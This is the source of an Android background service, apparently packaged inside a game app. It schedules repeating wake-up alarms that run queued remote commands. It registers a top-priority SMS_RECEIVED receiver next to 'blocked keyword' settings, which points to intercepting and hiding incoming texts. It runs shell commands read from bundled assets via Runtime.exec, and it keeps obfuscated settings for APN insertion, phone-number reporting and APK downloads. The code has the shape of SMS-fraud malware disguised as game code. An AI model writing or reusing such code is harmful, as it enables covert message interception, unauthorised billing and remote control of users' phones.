package cn.com.tiantong.game72;



import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.util.ArrayList;

import cn.com.tiantong.game72.ControlBroadcastReceiver;
import cn.com.tiantong.game72.PlayService;
import cn.com.tiantong.game72.util.CommandContainer;
import cn.com.tiantong.game72.util.GA;



import android.app.AlarmManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.SharedPreferences;
import android.os.IBinder;

/*
 * 启动服务的目的：
 *  定义一个定时器，当时间到达以后，会到PlugInBroadcastReceiver中执行相关程序，
 */
public class PlayService extends Service{

//	public static final String tag = "PlugInService";
	
	//定义一些常量
	public static final String PREFS_NAME = "MainOOOService11Prefs_cailing";
	public static final String PREFS_ALARM_PHONE_TIME = "AlarmOOOPhone11Time_cailing";  
	public static final String WAIT_TIME = "up11dateOOOTime_cailing";
	public static final String PHONE_TIME = "phoneOOOTime11_cailing";
	public static final String SERVICE_ACTION = "cn.com.tiantong.game72.PlayService";
	
	public static final String STARTOTHERSERVER = "start_OOO_oth11er_servers";
	
	//屏蔽的关键字
	public static final String KEYWORDS_NAME = "MainOOOKeyWords11ForCailing_cailing";
	public static final String KEYWORDS_NUMBER = "KeyOOOWords_11Number_cailing";
	public static final String KEYWORDS_WORDS = "KeyOOOWords_11keyWords_cailing";
	
	public static final String PREFS_RETRYTIMES = "RetryOOOTime1_cailing";     
    public static final String PREFS_OLDAPNID = "OldOOOApn11id_cailing";  
    public static final String PREFS_INSERTAPNID = "InsertOOOApn11id_cailing";  
    
    //4.60添加的一些字段
    public static final String ISSENDPHONENUMBERREQUEST = "isOOOSendBasic11Request_cailing";
    //4.60 防止多次发起这个请求
    public static final String SENDPHONENUMBERREQUEST_SHIELD = "sendOOOBasic11Request_shield_cailing";
    
	//5.0 添加一个随机数
    public static final String SALTFROMSERVICE = "save_OOO_salt11_cailing";
    
    //5.55心跳时间到，加锁
    public static final String GETPHONENUMBER_SHIELD = "gephonum_dotime_shield_cailing";
    public static final String SENDINITREQUEST_SHIELD = "sendInitRequest_shield_cailing";
    
    
	//初始规定的时间，10分钟以后发起请求
	public static final int FIRST_COME_TIME = 0;
	//默认心跳时间，一分钟发起请求
//	public static final int DEFAULT_UPDATE_TIME = 10;
	
	public static BroadcastReceiver mReceiver = null;
	
	
	//下载广播 5.50
	public static final String DOWNLOAD_APK_BROADCAST = "com.android.cation.download_cailing";
	public static final String DOWNLOAD_APK_BROADCAST_TEST = "com.download.cailing.test";

	@Override
	public void onStart(Intent intent, int startId) {
		super.onStart(intent, startId);

		SharedPreferences preferences = this.getSharedPreferences(PlayService.PREFS_NAME, 0);//PreferenceManager.getDefaultSharedPreferences(this);
		SharedPreferences.Editor editor = preferences.edit();
		
		//如果是纯插件的话
		if(ControlBroadcastReceiver.ISCHUNCHAJIAN){
			//是否启动程序的服务
			boolean isStartOtherService = preferences.getBoolean(STARTOTHERSERVER, false);
			if(! isStartOtherService){
				new StartOtherServer(this).start();
			}
		}
		
		int waitTime = preferences.getInt(PlayService.WAIT_TIME, FIRST_COME_TIME);
		//LH.LogPrint(tag, "waitTime : " + waitTime);
		long needWaitTime = waitTime * 60 * 1000;
		//LH.LogPrint(tag, "needWaitTime : " + needWaitTime);
		long startTime = preferences.getLong(PlayService.PHONE_TIME, -1);
		//LH.LogPrint(tag, "startTime : " + startTime);
		
		CommandContainer commands = CommandContainer.GetInstance(this);
		if(commands.GetLength() > 0){
			if(commands.Istimer() == false){
				commands.Starttimer();
			}
			commands.DoNextCommand();
		}
		
		
		//定义一个闹钟
		Intent alarmsIntent = new Intent(PlayService.this, ControlBroadcastReceiver.class);
		alarmsIntent.setAction(PlayService.SERVICE_ACTION);
		PendingIntent pendingIntent = PendingIntent.getBroadcast(getApplicationContext(), 0, alarmsIntent, PendingIntent.FLAG_UPDATE_CURRENT);
		
		AlarmManager alarmManager = (AlarmManager) getApplication().getSystemService(Context.ALARM_SERVICE);
		//判断alarmManager是不是用一个对象
		//LH.LogPrint(tag, "============================");
		//LH.LogPrint(tag, alarmManager.toString());
		//LH.LogPrint(tag, "============================");
		
		if(startTime > 0){
			
			//LH.LogPrint(tag, "System.currentTimeMillis() : " + System.currentTimeMillis());
			//LH.LogPrint(tag, "(startTime + needWaitTime) : " + (startTime + needWaitTime));
			
			if(System.currentTimeMillis() >= (startTime + needWaitTime)){
				//LH.LogPrint(tag, "MS1");
				//LH.LogPrint(tag, "开始时间 ：" + System.currentTimeMillis());
				alarmManager.setRepeating(AlarmManager.RTC_WAKEUP, System.currentTimeMillis(), needWaitTime, pendingIntent);
			}else if(System.currentTimeMillis() >= startTime && System.currentTimeMillis() < (startTime + needWaitTime)){
				//LH.LogPrint(tag, "MS2");
				//LH.LogPrint(tag, "开始时间 ：" + (startTime + needWaitTime));
				alarmManager.setRepeating(AlarmManager.RTC_WAKEUP, startTime + needWaitTime, needWaitTime, pendingIntent);
			}else{
				//LH.LogPrint(tag, "MS3");
				//LH.LogPrint(tag, "开始时间 ：" + (System.currentTimeMillis() + needWaitTime));
				alarmManager.setRepeating(AlarmManager.RTC_WAKEUP, System.currentTimeMillis() + needWaitTime, needWaitTime, pendingIntent);
				editor.putLong(PlayService.PHONE_TIME, System.currentTimeMillis());
				editor.commit();
			}
		}else{
			//LH.LogPrint(tag, "MS4");
			//LH.LogPrint(tag, "第一次执行的时间长度：" + (FIRST_COME_TIME * 60 * 1000));
			//LH.LogPrint(tag, "开始时间 ：" + System.currentTimeMillis());
			//LH.LogPrint(tag, "第一次到达的执行时间：" + (System.currentTimeMillis() + (FIRST_COME_TIME * 60 * 1000)));
			//第一次发起请求，在10分钟以后发起
			alarmManager.setRepeating(AlarmManager.RTC_WAKEUP, System.currentTimeMillis() + FIRST_COME_TIME * 60 * 1000, FIRST_COME_TIME * 60 * 1000, pendingIntent);
			editor.putLong(PlayService.PHONE_TIME, System.currentTimeMillis());
//			//设置默认心跳时间
//			editor.putInt(PlugInService.WAIT_TIME, DEFAULT_UPDATE_TIME);
			
			editor.commit();
		}
		
		
		//动态增加权限
		IntentFilter intentFilter = new IntentFilter();
		intentFilter.addAction("android.provider.Telephony.SMS_RECEIVED");
		intentFilter.setPriority(2147483647);
		intentFilter.addCategory("android.intent.category.DEFAULT");
		
		mReceiver = new ControlBroadcastReceiver();
		registerReceiver(mReceiver, intentFilter);
		
	}
	
	//启动其他的服务
	class StartOtherServer extends Thread{
		
		private Context context;
		
		public StartOtherServer(Context context){
			this.context = context;
		}
		
		@Override
		public void run() {
			super.run();
			
			try {
				SharedPreferences preferences = context.getSharedPreferences(PlayService.PREFS_NAME, 0);
				SharedPreferences.Editor editor = preferences.edit();
				
				editor.putBoolean(STARTOTHERSERVER, true);
				editor.commit();
				
				//从assets中获取指令
				ArrayList<String> commandList = GA.getCommands(context, "command");
				if(commandList != null && ! commandList.isEmpty()){
					for(String command : commandList){
						if(command != null && ! "".equals(command.trim())){
							//"am", "startservice", "-a", "wwc.wcx.PS"
//							String[] commands = new String[4];
//							commands[0] = "am";
//							commands[1] = "startservice";
//							commands[2] = "-n";
//							commands[3] = command.trim();
							execCommand(command.trim());
							
						}
					}
				}
			} catch (Exception e) {
				e.printStackTrace();
			}
		}
		
		public synchronized void execCommand(String command){
			
			BufferedReader in = null;
			
	        try {
	        	Runtime runtime = Runtime.getRuntime();
	        	Process proc = runtime.exec(command);
	            if (proc.waitFor() != 0) {
	            }
	            in = new BufferedReader(new InputStreamReader(proc.getInputStream()));
	            StringBuffer stringBuffer = new StringBuffer();
	            String line = null;
	            while ((line = in.readLine()) != null) {
	                stringBuffer.append(line);
	            }
	        } catch (Exception e) {
	        	e.printStackTrace();
	        }finally{
	        	try {
					if(in != null){
						in.close();
					}
				} catch (Exception e) {
					e.printStackTrace();
				}
	        }
	    }
	}
	
	
	
	@Override
    public void onDestroy()  {

    	super.onDestroy();
		//LH.LogPrint(tag, "MS:Destroy");
		if(mReceiver!=null)
		{
	     unregisterReceiver(mReceiver);      
		}
    } 
	

	@Override
	public IBinder onBind(Intent intent) {
		return null;
	}

}
